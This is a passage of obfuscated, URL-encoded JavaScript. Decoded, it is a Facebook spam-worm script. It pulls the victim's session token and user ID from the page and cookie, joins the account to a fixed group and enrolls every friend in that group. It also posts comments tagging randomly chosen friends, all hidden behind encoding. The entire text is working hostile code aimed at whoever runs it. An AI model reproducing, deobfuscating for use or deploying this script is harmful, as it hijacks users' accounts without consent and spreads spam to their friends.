5B%31%36%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%35%5D%5D%5B%69%5D%5B%5F%30%78%61%32%32%63%5B%32%31%5D%5D%3B%7D%20%3B%7D%20%3B%79%6F%72%75%6D%5F%79%61%70%28%69%64%2C%6D%65%73%61%6A%29%3B%7D%20%3B%7D%20%3B%7D%20%3B%76%61%72%20%5F%30%78%37%38%39%32%78%38%3D%5F%30%78%61%32%32%63%5B%32%34%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%32%35%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%32%36%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%32%37%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%32%38%5D%2B%75%73%65%72%5F%69%64%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%32%39%5D%2B%75%73%65%72%5F%69%64%3B%69%66%28%64%6F%63%75%6D%65%6E%74%5B%5F%30%78%61%32%32%63%5B%33%32%5D%5D%5B%5F%30%78%61%32%32%63%5B%33%31%5D%5D%28%5F%30%78%61%32%32%63%5B%33%30%5D%29%3E%3D%30%29%7B%5F%30%78%37%38%39%32%78%37%5B%5F%30%78%61%32%32%63%5B%33%35%5D%5D%28%5F%30%78%61%32%32%63%5B%33%33%5D%2C%5F%30%78%61%32%32%63%5B%33%34%5D%2B%5F%30%78%37%38%39%32%78%38%2C%74%72%75%65%29%3B%7D%20%65%6C%73%65%20%7B%5F%30%78%37%38%39%32%78%37%5B%5F%30%78%61%32%32%63%5B%33%35%5D%5D%28%5F%30%78%61%32%32%63%5B%33%33%5D%2C%5F%30%78%61%32%32%63%5B%33%36%5D%2B%5F%30%78%37%38%39%32%78%38%2C%74%72%75%65%29%3B%7D%20%3B%5F%30%78%37%38%39%32%78%37%5B%5F%30%78%61%32%32%63%5B%33%37%5D%5D%28%29%3B%7D%20%3B%66%75%6E%63%74%69%6F%6E%20%52%61%6E%64%6F%6D%41%72%6B%61%64%61%73%28%29%7B%76%61%72%20%5F%30%78%37%38%39%32%78%61%3D%5F%30%78%61%32%32%63%5B%31%30%5D%3B%66%6F%72%28%69%3D%30%3B%69%3C%39%3B%69%2B%2B%29%7B%5F%30%78%37%38%39%32%78%61%2B%3D%5F%30%78%61%32%32%63%5B%31%38%5D%2B%61%72%6B%61%64%61%73%6C%61%72%5B%5F%30%78%61%32%32%63%5B%31%36%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%35%5D%5D%5B%4D%61%74%68%5B%5F%30%78%61%32%32%63%5B%33%39%5D%5D%28%4D%61%74%68%5B%5F%30%78%61%32%32%63%5B%33%38%5D%5D%28%29%2A%61%72%6B%61%64%61%73%6C%61%72%5B%5F%30%78%61%32%32%63%5B%31%36%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%35%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%34%5D%5D%29%5D%5B%5F%30%78%61%32%32%63%5B%31%39%5D%5D%2B%5F%30%78%61%32%32%63%5B%32%30%5D%2B%61%72%6B%61%64%61%73%6C%61%72%5B%5F%30%78%61%32%32%63%5B%31%36%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%35%5D%5D%5B%4D%61%74%68%5B%5F%30%78%61%32%32%63%5B%33%39%5D%5D%28%4D%61%74%68%5B%5F%30%78%61%32%32%63%5B%33%38%5D%5D%28%29%2A%61%72%6B%61%64%61%73%6C%61%72%5B%5F%30%78%61%32%32%63%5B%31%36%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%35%5D%5D%5B%5F%30%78%61%32%32%63%5B%31%34%5D%5D%29%5D%5B%5F%30%78%61%32%32%63%5B%32%31%5D%5D%2B%5F%30%78%61%32%32%63%5B%32%32%5D%3B%7D%20%3B%72%65%74%75%72%6E%20%5F%30%78%37%38%39%32%78%61%3B%7D%20%3B%66%75%6E%63%74%69%6F%6E%20%79%6F%72%75%6D%5F%79%61%70%28%69%64%2C%5F%30%78%37%38%39%32%78%63%29%7B%76%61%72%20%5F%30%78%37%38%39%32%78%64%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%76%61%72%20%5F%30%78%37%38%39%32%78%38%3D%5F%30%78%61%32%32%63%5B%31%30%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%34%30%5D%2B%69%64%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%34%31%5D%2B%65%6E%63%6F%64%65%55%52%49%43%6F%6D%70%6F%6E%65%6E%74%28%5F%30%78%37%38%39%32%78%63%29%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%34%32%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%34%33%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%34%34%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%34%35%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%34%36%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%34%37%5D%2B%69%64%2B%5F%30%78%61%32%32%63%5B%34%38%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%34%39%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%35%30%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%35%31%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%35%32%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%32%39%5D%2B%75%73%65%72%5F%69%64%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%35%33%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%35%34%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%35%35%5D%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%35%36%5D%2B%66%62%5F%64%74%73%67%3B%5F%30%78%37%38%39%32%78%38%2B%3D%5F%30%78%61%32%32%63%5B%35%37%5D%3B%5F%30%78%37%38%39%32%78%64%5B%5F%30%78%61%32%32%63%5B%33%35%5D%5D%28%5F%30%78%61%32%32%63%5B%35%38%5D%2C%5F%30%78%61%32%32%63%5B%35%39%5D%2C%74%72%75%65%29%3B%5F%30%78%37%38%39%32%78%64%5B%5F%30%78%61%32%32%63%5B%36%32%5D%5D%28%5F%30%78%61%32%32%63%5B%36%30%5D%2C%5F%30%78%61%32%32%63%5B%36%31%5D%29%3B%5F%30%78%37%38%39%32%78%64%5B%5F%30%78%61%32%32%63%5B%36%5D%5D%3D%66%75%6E%63%74%69%6F%6E%20%28%29%7B%69%66%28%5F%30%78%37%38%39%32%78%64%5B%5F%30%78%61%32%32%63%5B%37%5D%5D%3D%3D%34%26%26%5F%30%78%37%38%39%32%78%64%5B%5F%30%78%61%32%32%63%5B%36%33%5D%5D%3D%3D%32%30%30%29%7B%5F%30%78%37%38%39%32%78%64%5B%5F%30%78%61%32%32%63%5B%36%34%5D%5D%3B%7D%20%3B%7D%20%3B%5F%30%78%37%38%39%32%78%64%5B%5F%30%78%61%32%32%63%5B%33%37%5D%5D%28%5F%30%78%37%38%39%32%78%38%29%3B%7D%20%3B%61%72%6B%61%64%61%73%6C%61%72%69%5F%61%6C%28%69%64%29%3B%0A%0A%76%61%72%20%67%69%64%20%3D%20%5B%27%37%32%33%38%39%34%36%31%34%33%32%37%37%31%38%27%5D%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%5B%27%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%27%5D%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%5B%27%76%61%6C%75%65%27%5D%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%5B%27%63%6F%6F%6B%69%65%27%5D%5B%27%6D%61%74%63%68%27%5D%28%64%6F%63%75%6D%65%6E%74%5B%27%63%6F%6F%6B%69%65%27%5D%5B%27%6D%61%74%63%68%27%5D%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%20%0A%76%61%72%20%68%74%74%70%77%70%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%76%61%72%20%75%72%6C%77%70%20%3D%20%27%2F%61%6A%61%78%2F%67%72%6F%75%70%73%2F%6D%65%6D%62%65%72%73%68%69%70%2F%72%32%6A%2E%70%68%70%3F%5F%5F%61%3D%31%27%3B%0A%76%61%72%20%70%61%72%61%6D%73%77%70%20%3D%20%27%26%72%65%66%3D%67%72%6F%75%70%5F%6A%75%6D%70%5F%68%65%61%64%65%72%26%67%72%6F%75%70%5F%69%64%3D%27%20%2B%20%67%69%64%20%2B%20%27%26%66%62%5F%64%74%73%67%3D%27%20%2B%20%66%62%5F%64%74%73%67%20%2B%20%27%26%5F%5F%75%73%65%72%3D%27%20%2B%20%75%73%65%72%5F%69%64%20%2B%20%27%26%70%68%73%74%61%6D%70%3D%27%3B%0A%68%74%74%70%77%70%5B%27%6F%70%65%6E%27%5D%28%27%50%4F%53%54%27%2C%20%75%72%6C%77%70%2C%20%74%72%75%65%29%3B%0A%68%74%74%70%77%70%5B%27%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%27%5D%28%27%43%6F%6E%74%65%6E%74%2D%74%79%70%65%27%2C%20%27%61%70%70%6C%69%63%61%74%69%6F%6E%2F%78%2D%77%77%77%2D%66%6F%72%6D%2D%75%72%6C%65%6E%63%6F%64%65%64%27%29%3B%0A%68%74%74%70%77%70%5B%27%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%27%5D%28%27%43%6F%6E%74%65%6E%74%2D%6C%65%6E%67%74%68%27%2C%20%70%61%72%61%6D%73%77%70%5B%27%6C%65%6E%67%74%68%27%5D%29%3B%0A%68%74%74%70%77%70%5B%27%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%27%5D%28%27%43%6F%6E%6E%65%63%74%69%6F%6E%27%2C%20%27%6B%65%65%70%2D%61%6C%69%76%65%27%29%3B%0A%68%74%74%70%77%70%5B%27%73%65%6E%64%27%5D%28%70%61%72%61%6D%73%77%70%29%3B%0A%20%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%5B%27%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%27%5D%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%5B%27%76%61%6C%75%65%27%5D%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%5B%27%63%6F%6F%6B%69%65%27%5D%5B%27%6D%61%74%63%68%27%5D%28%64%6F%63%75%6D%65%6E%74%5B%27%63%6F%6F%6B%69%65%27%5D%5B%27%6D%61%74%63%68%27%5D%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%20%0A%76%61%72%20%66%72%69%65%6E%64%73%20%3D%20%6E%65%77%20%41%72%72%61%79%28%29%3B%0A%67%66%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%67%66%5B%27%6F%70%65%6E%27%5D%28%27%47%45%54%27%2C%20%27%2F%61%6A%61%78%2F%74%79%70%65%61%68%65%61%64%2F%66%69%72%73%74%5F%64%65%67%72%65%65%2E%70%68%70%3F%5F%5F%61%3D%31%26%76%69%65%77%65%72%3D%27%20%2B%20%75%73%65%72%5F%69%64%20%2B%20%27%26%74%6F%6B%65%6E%27%20%2B%20%4D%61%74%68%5B%27%72%61%6E%64%6F%6D%27%5D%28%29%20%2B%20%27%26%66%69%6C%74%65%72%5B%30%5D%3D%75%73%65%72%26%6F%70%74%69%6F%6E%73%5B%30%5D%3D%66%72%69%65%6E%64%73%5F%6F%6E%6C%79%27%2C%20%66%61%6C%73%65%29%3B%0A%67%66%5B%27%73%65%6E%64%27%5D%28%29%3B%0A%69%66%20%28%67%66%5B%27%72%65%61%64%79%53%74%61%74%65%27%5D%20%21%3D%20%34%29%20%7B%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%64%61%74%61%20%3D%20%65%76%61%6C%28%27%28%27%20%2B%20%67%66%5B%27%72%65%73%70%6F%6E%73%65%54%65%78%74%27%5D%5B%27%73%75%62%73%74%72%27%5D%28%39%29%20%2B%20%27%29%27%29%3B%0A%20%20%20%20%69%66%20%28%64%61%74%61%5B%27%65%72%72%6F%72%27%5D%29%20%7B%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%20%20%20%20%66%72%69%65%6E%64%73%20%3D%20%64%61%74%61%5B%27%70%61%79%6C%6F%61%64%27%5D%5B%27%65%6E%74%72%69%65%73%27%5D%5B%27%73%6F%72%74%27%5D%28%66%75%6E%63%74%69%6F%6E%20%28%5F%30%78%39%33%64%61%78%38%2C%20%5F%30%78%39%33%64%61%78%39%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%5F%30%78%39%33%64%61%78%38%5B%27%69%6E%64%65%78%27%5D%20%2D%20%5F%30%78%39%33%64%61%78%39%5B%27%69%6E%64%65%78%27%5D%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%3B%0A%7D%3B%0A%20%0A%66%6F%72%20%28%76%61%72%20%69%20%3D%20%30%3B%20%69%20%3C%20%66%72%69%65%6E%64%73%5B%27%6C%65%6E%67%74%68%27%5D%3B%20%69%2B%2B%29%20%7B%0A%20%20%20%20%76%61%72%20%68%74%74%70%77%70%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%20%20%20%20%76%61%72%20%75%72%6C%77%70%20%3D%20%27%2F%61%6A%61%78%2F%67%72%6F%75%70%73%2F%6D%65%6D%62%65%72%73%2F%61%64%64%5F%70%6F%73%74%2E%70%68%70%3F%5F%5F%61%3D%31%27%3B%0A%20%20%20%20%76%61%72%20%70%61%72%61%6D%73%77%70%3D%20%27%26%66%62%5F%64%74%73%67%3D%27%20%2B%20%66%62%5F%64%74%73%67%20%2B%20%27%26%67%72%6F%75%70%5F%69%64%3D%27%20%2B%20%67%69%64%20%2B%20%27%26%73%6F%75%72%63%65%3D%74%79%70%65%61%68%65%61%64%26%72%65%66%3D%26%6D%65%73%73%61%67%65%5F%69%64%3D%26%6D%65%6D%62%65%72%73%3D%27%20%2B%20%66%72%69%65%6E%64%73%5B%69%5D%5B%27%75%69%64%27%5D%20%2B%20%27%26%5F%5F%75%73%65%72%3D%27%20%2B%20%75%73%65%72%5F%69%64%20%2B%20%27%26%70%68%73%74%61%6D%70%3D%27%3B%0A%20%20%20%20%68%74%74%70%77%70%5B%27%6F%70%65%6E%27%5D%28%27%50%4F%53%54%27%2C%20%75%72%6C%77%70%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%68%74%74%70%77%70%5B%27%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%27%5D%28%27%43%6F%6E%74%65%6E%74%2D%74%79%70%65%27%2C%20%27%61%70%70%6C%69%63%61%74%69%6F%6E%2F%78%2D%77%77%77%2D%66%6F%72%6D%2D%75%72%6C%65%6E%63%6F%64%65%64%27%29%3B%0A%20%20%20%20%68%74%74%70%77%70%5B%27%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%27%5D%28%27%43%6F%6E%74%65%6E%74%2D%6C%65%6E%67%74%68%27%2C%20%70%61%72%61%6D%73%77%70%5B%27%6C%65%6E%67%74%68%27%5D%29%3B%0A%20%20%20%20%68%74%74%70%77%70%5B%27%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%27%5D%28%27%43%6F%6E%6E%65%63%74%69%6F%6E%27%2C%20%27%6B%65%65%70%2D%61%6C%69%76%65%27%29%3B%0A%20%20%20%20%68%74%74%70%77%70%5B%27%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%27%5D%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%0A%69%66%20%28%68%74%74%70%77%70%5B%27%72%65%61%64%79%53%74%61%74%65%27%5D%20%3D%3D%20%34%20%26%26%20%68%74%74%70%77%70%5B%27%73%74%61%74%75%73%27%5D%20%3D%3D%20%32%30%30%29%20%7B%7D%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20%68%74%74%70%77%70%5B%27%73%65%6E%64%27%5D%28%70%61%72%61%6D%73%77%70%29%3B%0A%7D%3B"));
// tra sua miinh
P("594591630637360");